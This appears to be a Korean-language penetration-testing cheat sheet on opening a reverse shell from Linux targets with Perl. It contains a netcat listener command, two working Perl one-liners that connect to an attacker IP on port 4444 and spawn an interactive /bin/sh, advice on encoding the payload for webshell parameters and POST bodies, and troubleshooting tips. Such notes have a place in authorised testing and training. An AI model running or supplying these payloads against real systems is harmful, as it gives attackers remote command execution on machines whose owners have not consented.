# Linux Perl 리버스 셸

- perl Socket 모듈로 TCP 연결을 열어 STDIN/STDOUT/STDERR을 소켓에 물리고 `/bin/sh -i`를 exec하는 리버스 셸 원라이너. perl만 있으면 도는 최소 구성이다.
- python이 없는 오래된 시스템(구형 Debian·CentOS, 임베디드)에서 셸을 열 때. bash /dev/tcp가 막힌 환경에서의 두 번째 후보이기도 하다.
- 타깃에 perl 존재(`which perl`로 확인), 공격자 리스너 사전 실행, 타깃에서 공격자 IP로 TCP 아웃바운드 허용이 필요하다.

## 리스너 준비 (공격자)

```bash
nc -lvnp 4444
```

## 기본 원라이너 (타깃)

```bash
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- `$i`는 공격자 IP, `$p`는 리스너 포트. 이 두 값만 바꾼다.
- socket → connect → fd 복제(STDIN/OUT/ERR → 소켓) → exec 순서다. exec이 호출되면 perl 프로세스가 sh로 대체된다.
- 인용부호가 겹치므로 웹셸 파라미터에 넣을 때는 전체를 큰따옴표 컨텍스트에 맞춰 인코딩한다.

## 축약형 (fd 병합 버전)

```bash
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");exec("/bin/sh -i");'
```

- stderr까지 안 물려도 명령 실행에는 문제가 없다. 에러 출력이 필요하면 기본형을 쓴다.

## 실행 확인 (타깃)

```bash
which perl
perl -v
```

- perl이 없으면 python 버전(shells/reverse-shell/linux_python_reverse_shell.md)이나 bash /dev/tcp 버전으로 전환한다.

## 전송 시 주의점

```text
1. 작은따옴표 안에 작은따옴표를 넣지 않는다 ($i="..." 는 큰따옴표)
2. 세미콜론이 명령 구분자로 먼저 해석되지 않게 전체를 감싼다
3. 웹 요청 본문(POST data)에 넣으면 & 는 파라미터 구분자가 되므로 인코딩한다
```

## 트러블슈팅

- 연결이 안 오면 아웃바운드 차단이나 리스너 미실행이다. nc 리스너 로그에 SYN이 찍히는지로 구분한다.
- `Can't locate object method` 같은 에러가 셸에 안 보이고 연결이 바로 닫히면 perl 버전이 매우 낮은 것이다. Socket 모듈 없이 POSIX socket()을 쓰는 변형이 필요하다 — 이 경우 revshells.com 생성기의 perl 변형을 참고한다.
- 셸이 열렸는데 프롬프트가 안 보여도 명령은 들어간다. `id`를 타이핑해 반응으로 확인한다.
- 연결이 불안정하면 안정화(python_pty) 또는 다른 원라이너(bash·python)로 전환한다.
